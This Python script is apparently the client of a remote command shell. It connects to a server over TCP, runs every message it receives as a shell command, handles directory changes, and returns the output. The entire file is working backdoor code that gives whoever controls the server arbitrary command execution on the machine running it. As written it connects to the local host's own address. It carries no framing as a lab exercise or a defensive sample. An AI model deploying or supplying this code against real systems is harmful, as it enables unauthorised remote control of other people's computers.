#!/usr/bin/env python3
import socket
import os
import subprocess
import pathlib
import tqdm

HEADER = 64
PORT = 5051
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "exit"
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


def execute_command(conn, cmd_str):
    try:
        proc = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        print("Command failed " + cmd_str)
    stdoutput = (proc.stdout.read() + proc.stderr.read()).decode()
    snd_msg(conn, stdoutput)

def snd_msg(conn, msg):
    message = msg.encode(FORMAT)
    length = str(len(message)).encode(FORMAT)
    length += b' ' * (HEADER - len(length))
    conn.send(length)
    conn.send(message)

def listen_to_server(conn):
    print(f"Connected to {SERVER}")
    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)
            print(msg)

            if msg == DISCONNECT_MESSAGE:
                connected = False
            elif msg[:2] == "cd":
                try:
                    abs_path = os.path.abspath(os.path.join(os.getcwd(), msg[3:]))
                    os.chdir(abs_path)
                    snd_msg(conn, os.getcwd())
                except:
                    snd_msg(conn, "Failed to change directory.")
            else:
                execute_command(conn, msg)
    conn.close()

listen_to_server(client)
